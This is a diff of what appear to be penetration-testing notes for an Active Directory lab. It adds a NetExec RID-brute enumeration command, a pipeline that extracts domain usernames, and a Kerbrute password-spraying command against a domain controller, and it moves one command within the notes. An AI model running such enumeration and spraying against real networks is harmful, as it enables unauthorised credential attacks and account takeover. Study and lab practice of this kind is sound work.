@@ -4,6 +4,21 @@ Once credentials or many credentials are found we'll have to utilize them to spr
 - Create wordlist of all domain users.
 - Create wordlist of all retrieved passwords/hashes.
 
+
+```
+nxc smb 192.168.230.244 -u 'ka' -p 'ka' --rid-brute
+```
+
+```
+grep "SidTypeUser" users.txt | cut -d '\' -f2 | cut -d ' ' -f1 > newusers.txt
+```
+
+##### Kerbrute passwordspraying
+
+```
+./kerbrute -d thm.local --dc 10.114.134.197 passwordspray ~/newusers.txt 'CHANGEME2023!'
+```
+
 ## IMPORTANT
 
 ACCOUNTS GET LOCKED OUT!
@@ -49,13 +64,6 @@ This will enumerate the description, which could hide an password.
 ```
 nxc smb 192.168.230.244 -u 'ka' -p 'ka' --users
 ```
-
-Will check if an user is local or domain.
-
-```
-nxc smb 192.168.230.244 -u 'ka' -p 'ka' --rid-brute
-```
-
 ##### If Creds aren't domain, only local we have to use the following:
 
 ```
